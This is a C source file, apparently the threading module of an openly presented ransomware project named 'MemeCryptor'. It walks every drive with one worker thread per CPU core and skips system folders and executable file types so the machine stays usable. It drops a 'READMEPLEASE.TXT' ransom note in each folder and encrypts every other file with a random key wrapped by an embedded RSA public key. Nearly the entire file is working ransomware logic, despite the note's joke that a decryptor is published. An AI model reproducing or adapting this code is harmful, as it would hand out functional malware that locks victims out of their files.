#include "Threading.h"
THREAD_STRUCT threadStruct;
LPCSTR ransomNoteContent = "YA YEET!!\n\nYou have officially been memed by MemeCryptor Ransomware!\n\nAll your files are now encrypted and embedded inside an image format.\nIf you try to use any recovery software outhere, the files can potentially be damaged and unretrievable...\n\nJust kidding! I have included my decrypting software on the github repo,\nso you can download and decrypt your stuff!!\n\n---------------------------------------------------------\n\nFeel free to contact me on Twitter @cPeterr to provide any feedback!\n\nThanks,\nPeter\n";
int checkDirName(LPSTR directoryName) {
	LPCSTR dirNameExcludeArray[16] = { "AppData", "tmp", "winnt", "temp", "thumb", "$Recycle.Bin", "$RECYCLE.BIN", "System Volume Information", "Boot", "Windows", "$WINDOWS.~BT", "Windows.old", "PerfLog", "Microsoft" };
	for (int i = 0; i < 16; i++) {
		if (!lstrcmpA(directoryName, dirNameExcludeArray[i])) {
			return -1;
		}
	}
	return 0;
}
int checkFileName(LPSTR directoryName) {
	LPCSTR fileNameExcludeArray[15] = { ".exe", ".dll", ".sys", ".msi", ".mui", ".inf", ".cat", ".bat", ".cmd", ".ps1", ".vbs", ".ttf", ".fon", ".lnk", "READMEPLEASE.TXT" };
	for (int i = 0; i < 15; i++) {
		if (StrStrIA(directoryName, fileNameExcludeArray[i])) {
			return -1;
		}
	}
	return 0;
}

void dropRansomNote(LPSTR directoryName) {
	LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen("READMEPLEASE.TXT") + 1, 1);
	if (!fileName) {
		return;
	}

	strncpy(fileName, directoryName, strlen(directoryName) - 1);
	strcat(fileName, "READMEPLEASE.TXT\0");

	HANDLE ransomNote = CreateFileA(fileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (ransomNote == INVALID_HANDLE_VALUE) {
		free(fileName);
		return;
	}
	WriteFile(ransomNote, ransomNoteContent, strlen(ransomNoteContent), NULL, NULL);
	CloseHandle(ransomNote);
	free(fileName);
}

int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR directoryName, THREAD_STRUCT* pThreadStruct) {
	HANDLE hSearchHandle = NULL;
	WIN32_FIND_DATAA findFileData = WIN32_FIND_DATAA();
	LPSTR fileName = NULL;
	int returnValue = -1;
	BYTE* key = NULL;
	BYTE* nonce = NULL;
	hSearchHandle = FindFirstFileA(directoryName, &findFileData);

	if (hSearchHandle == INVALID_HANDLE_VALUE) {
		goto CLEANUP;
	}
	dropRansomNote(directoryName);
	// 10387 small files -> 15039 ms to encrypt small files
	// 53 medium files -> 6237 ms to encrypt medium files
	// 25 large files -> 25000 ms to encrypt large files
	do {
		if (StrStrIA(findFileData.cFileName, "Microsoft")) {
			continue;
		}

		if (lstrcmpA(findFileData.cFileName, ".")) {
			if (lstrcmpA(findFileData.cFileName, "..")) {
				if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)) {
					if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

						if (findFileData.cFileName[0] == '.') {
							continue;
						}

						if (checkDirName(findFileData.cFileName) == -1) {
							continue;
						}

						LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen(findFileData.cFileName) + strlen("\\*"), 1);
						if (!fileName) {
							continue;
						}

						strncpy(fileName, directoryName, strlen(directoryName) - 1);
						strcat(fileName, findFileData.cFileName);
						strcat(fileName, "\\*");
						EnterCriticalSection(&pThreadStruct->threadCriticalSection);
						addNode(pThreadStruct, fileName);
						LeaveCriticalSection(&pThreadStruct->threadCriticalSection);
					}
					else {
						if (checkFileName(findFileData.cFileName) == -1) {
							continue;
						}

						LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen(findFileData.cFileName) + 1, 1);
						if (!fileName) {
							continue;
						}
						strncpy(fileName, directoryName, strlen(directoryName) - 1);
						strcat(fileName, findFileData.cFileName);

						key = (BYTE*)calloc(256, 1);


						if (!key) {
							free(fileName);
							continue;
						}

						nonce = (BYTE*)calloc(8, 1);

						if (!nonce) {
							free(fileName);
							free(key);
							continue;
						}

						if (!CryptGenRandom(hCryptProv, 256, key)) {
							free(fileName);
							free(key);
							free(nonce);
							continue;
						}

						if (!CryptGenRandom(hCryptProv, 8, nonce)) {
							free(fileName);
							free(key);
							free(nonce);
							continue;
						}
						fileEncrypt(hCryptProv, publicKey, fileName, key, nonce);

						free(fileName);
						free(key);
						free(nonce);
					}
				}
			}
		}
	} while (FindNextFileA(hSearchHandle, &findFileData) != 0);

	returnValue = 0;
CLEANUP:
	if (hSearchHandle) {
		FindClose(hSearchHandle);
	}
	return returnValue;
}

int acquireContext(HCRYPTPROV* phCryptProv) {
	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return 0;
	}
	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, 0xF0000008)) {
		return 0;
	}
	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return 0;
	}
	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)", PROV_RSA_AES, 0xF0000008)) {
		return 0;
	}
	return -1;
}

// make sure cryptinit has been called already
void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
	DWORD currThreadID;
	HCRYPTPROV hCryptProv;
	HCRYPTKEY publicKey;
	int returnVal = -1;
	int threadID = -1;
	currThreadID = GetCurrentThreadId();

	for (int i = 0; i < pThreadStruct->threadCount; i++) {
		if (currThreadID == GetThreadId(pThreadStruct->threadArray[i])) {
			threadID = i;
			break;
		}
	}

	if (acquireContext(&hCryptProv) == -1) {
		goto CLEANUP;
	}

	if (CryptImportKey(hCryptProv, publicKeyBlob, 532, 0, 0, &publicKey) == FALSE) {
		goto CLEANUP;
	}

	while (TRUE) {
		LL_NODE* curr = NULL;
		int counter = 0;
		while (TRUE) {
			if (counter == 2) {
				goto CLEANUP;
			}
			EnterCriticalSection(&pThreadStruct->threadCriticalSection);
			if (pThreadStruct->head) {
				curr = popNode(pThreadStruct);
				break;
			}
			LeaveCriticalSection(&pThreadStruct->threadCriticalSection);
			counter++;
		}

		if (!curr) {
			continue;
		}

		LPSTR dirName = (LPSTR)calloc(strlen(curr->dirName) + 1, 1);
		if (!dirName) {
			continue;
		}
		strcpy(dirName, curr->dirName);
		freeNode(curr);

		LeaveCriticalSection(&pThreadStruct->threadCriticalSection);

		mainThreadEncryption(hCryptProv, publicKey, dirName, pThreadStruct);

		if (dirName) {
			free(dirName);
		}
	}

CLEANUP:
	if (hCryptProv) {
		CryptReleaseContext(hCryptProv, 0);
	}
	ExitThread(returnVal);
}

int initThreadStruct() {
	THREAD_STRUCT* pThreadStruct = &threadStruct;

	SYSTEM_INFO systemInfo = SYSTEM_INFO();

	GetNativeSystemInfo(&systemInfo);

	pThreadStruct->threadCount = systemInfo.dwNumberOfProcessors;

	HANDLE* buffer = (HANDLE*)calloc(4 * pThreadStruct->threadCount, 1);
	if (!buffer) {
		return -1;
	}
	InitializeCriticalSection(&pThreadStruct->threadCriticalSection);

	pThreadStruct->threadArray = buffer;
	return 0;
}


void launchThreadEncrypt(LPSTR drivePath) {

	THREAD_STRUCT* pThreadStruct = &threadStruct;
	LPSTR firstDir = (LPSTR)(calloc(strlen(drivePath) + 3, 1));
	if (!firstDir) {
		return;
	}
	strcpy(firstDir, drivePath);
	strcat(firstDir, "\\*\0");

	addNode(pThreadStruct, firstDir);
	for (int i = 0; i < pThreadStruct->threadCount; i++) {
		pThreadStruct->threadArray[i] = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)threadEncrypt, pThreadStruct, 0, 0);
		if (pThreadStruct->threadArray[i] == 0 || pThreadStruct->threadArray[i] == INVALID_HANDLE_VALUE) {
			continue;
		}
	}
}


void cleanUpThread() {
	THREAD_STRUCT* pThreadStruct = &threadStruct;

	WaitForMultipleObjects(pThreadStruct->threadCount, pThreadStruct->threadArray, TRUE, INFINITE);
	DeleteCriticalSection(&pThreadStruct->threadCriticalSection);
	if (pThreadStruct->threadArray) {
		for (int i = 0; i < pThreadStruct->threadCount; i++) {
			if (pThreadStruct->threadArray[i]) {
				CloseHandle(pThreadStruct->threadArray[i]);
			}
		}
		free(pThreadStruct->threadArray);
	}
}

void freeNode(LL_NODE* node) {
	if (node) {
		if (node->dirName) {
			free(node->dirName);
		}
		free(node);
	}
}

LL_NODE* popNode(THREAD_STRUCT* pThreadStruct) {
	if (pThreadStruct->head) {
		LL_NODE* result = pThreadStruct->head;
		pThreadStruct->head = result->nextNode;
		return result;
	}
	return NULL;

}

int addNode(THREAD_STRUCT* pThreadStruct, LPSTR name) {

	LL_NODE* node = newNode();
	if (!node) {
		return -1;
	}
	if (pThreadStruct->head == NULL) {
		pThreadStruct->head = node;
		pThreadStruct->tail = pThreadStruct->head;
		pThreadStruct->tail->dirName = name;
	}
	else {
		pThreadStruct->tail->nextNode = node;
		pThreadStruct->tail = pThreadStruct->tail->nextNode;
		pThreadStruct->tail->dirName = name;
	}
	return 0;
}

LL_NODE* newNode() {
	LL_NODE* node = (LL_NODE*)calloc(sizeof(LL_NODE), 1);
	if (!node) {
		return NULL;
	}
	node->dirName = NULL;
	node->nextNode = NULL;
	return node;
}